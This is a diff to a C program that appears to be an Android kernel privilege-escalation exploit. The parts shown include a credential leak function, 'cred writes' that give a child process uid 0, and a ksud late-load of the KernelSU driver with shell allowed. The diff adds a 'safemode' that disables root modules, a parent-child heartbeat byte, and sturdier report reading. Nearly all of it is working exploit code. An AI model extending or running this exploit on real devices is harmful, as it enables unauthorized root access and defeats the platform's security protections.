@@ -55,6 +55,7 @@
 #include <sys/resource.h>
 #include <sys/stat.h>
 #include <sys/utsname.h>
+#include <dirent.h>
 
 #define TR "/sys/kernel/tracing"
 #define CPU_TRIG 2
@@ -883,7 +884,6 @@ static void write_ksu_script(void)
         "ls -l \"$KSUD\" 2>&1 | head -1\n"
         "if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing'; pm list packages 2>/dev/null | grep -i -E 'sukisu|kernelsu'; ls /data/app 2>&1 | head -20; exit 1; fi\n"
         "echo \"[ksu] ksud=$KSUD version=$(\"$KSUD\" --version 2>&1 | head -1)\"\n"
-        "if [ -f /data/local/tmp/safemode_enable ]; then echo '[ksu] safemode: disabling all modules under /data/adb/modules'; for d in /data/adb/modules/*/; do touch \"$d/disable\" 2>/dev/null; done; ls /data/adb/modules/*/disable 2>&1 | head -20; fi\n"
         "\"$KSUD\" late-load --kmi android14-6.1 --allow-shell "
         "--package-name \"$PKG\"\n"
         "echo \"[ksu] late-load rc=$?\"\n"
@@ -1591,6 +1591,45 @@ static unsigned long long leak_cred(unsigned char *raw,
     return 0;
 }
 
+/* Safemode (GhostLock pattern: passed as command param, enforced natively
+ * by the rooted child before ksud late-load). Creates
+ * /data/adb/modules/<name>/disable for every installed module. */
+static void run_safemode_disable(void)
+{
+    DIR *md = opendir("/data/adb/modules");
+    int n = 0;
+
+    if (!md)
+    {
+        logf("[safemode] cannot open /data/adb/modules: errno=%d\n", errno);
+        return;
+    }
+    logf("[safemode] disabling modules under /data/adb/modules\n");
+    for (;;)
+    {
+        struct dirent *e = readdir(md);
+        char path[512];
+        int fd;
+
+        if (!e)
+            break;
+        if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, ".."))
+            continue;
+        snprintf(path, sizeof(path), "/data/adb/modules/%s/disable", e->d_name);
+        fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (fd < 0)
+            logf("[safemode] cannot disable %s: errno=%d\n", e->d_name, errno);
+        else
+        {
+            close(fd);
+            n++;
+            logf("[safemode] disabled %s\n", e->d_name);
+        }
+    }
+    closedir(md);
+    logf("[safemode] disabled %d module(s)\n", n);
+}
+
 static int wait_child_main(const char *mode)
 {
     struct child_report rep;
@@ -1603,6 +1642,13 @@ static int wait_child_main(const char *mode)
     if (read(3, &ch, 1) != 1)
         _exit(131);
     close(3);
+    /* Heartbeat immediately after wake (before any other work): proves wake
+     * receipt even when the child dies before its report (n=0 diagnosis). */
+    {
+        char hb = (char)0x48; /* 'H' */
+        (void)write(4, &hb, sizeof(hb));
+    }
+    int child_safemode = (ch == (char)0x53); /* 'S' = wake with safemode */
 
     memset(&rep, 0, sizeof(rep));
     rep.magic = CHILD_MAGIC;
@@ -1646,6 +1692,8 @@ static int wait_child_main(const char *mode)
 
         logf("[fake] child uid=%d euid=%d; SukiSU late-load (no mount, no system write)\n",
              rep.uid, rep.euid);
+        if (child_safemode)
+            run_safemode_disable();
         /* SukiSU late-load only (V2352GA android14-6.1).
          * GhostLock-style: load GKI driver kernelsu.ko via ksud, then start ksud.
          * NO mount, NO system partition RW, NO AVB trip. Only /data/local/tmp writes. */
@@ -2170,21 +2218,47 @@ int main(int argc, char **argv)
         if (stage_write(fc.A + 20, 0, "fake_euid", raw, NULL))
             park_forever("fake euid fix failed");
     }
+    if (argc > 2 && !strcmp(argv[2], "safemode"))
+        logf("[*] safemode ON: modules will be disabled natively pre-load\n");
     logf("[+] cred writes landed, waking child\n");
 
-    if (write(go_fd, "A", 1) != 1)
+    if (write(go_fd, (argc > 2 && !strcmp(argv[2], "safemode")) ? "S" : "A", 1) != 1)
         logf("[!] child wake write failed\n");
     close(go_fd);
 
     {
         struct child_report rep;
         struct pollfd pf = {.fd = st_fd, .events = POLLIN};
-        ssize_t rn = -1;
+        ssize_t got = 0;
+        long t_end = now_ms() + 15000;
+        char hb = 0;
+        ssize_t hn = 0;
 
-        if (poll(&pf, 1, 10000) > 0)
-            rn = read(st_fd, &rep, sizeof(rep));
+        /* Framing: 1-byte heartbeat first (proves wake receipt even if the
+         * child dies before its report), then the full report struct. */
+        memset(&rep, 0, sizeof(rep));
+        if (poll(&pf, 1, 5000) > 0)
+            hn = read(st_fd, &hb, 1);
+        if (hn == 1 && hb == (char)0x48)
+            logf("[+] child heartbeat: wake received\n");
+        else
+            logf("[!] no child heartbeat (n=%zd)\n", hn);
+        while (hn == 1 && got < (ssize_t)sizeof(rep) && now_ms() < t_end)
+        {
+            int pr = poll(&pf, 1, 2000);
+
+            if (pr <= 0)
+                break;
+            {
+                ssize_t rn = read(st_fd, (char *)&rep + got, sizeof(rep) - got);
+
+                if (rn <= 0)
+                    break;
+                got += rn;
+            }
+        }
         close(st_fd);
-        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
+        if (got == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
         {
             logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                  rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
@@ -2194,7 +2268,7 @@ int main(int argc, char **argv)
         }
         else
         {
-            logf("[!] child report missing (n=%zd)\n", rn);
+            logf("[!] child report missing (got=%zd/%zu)\n", got, sizeof(rep));
         }
     }
 
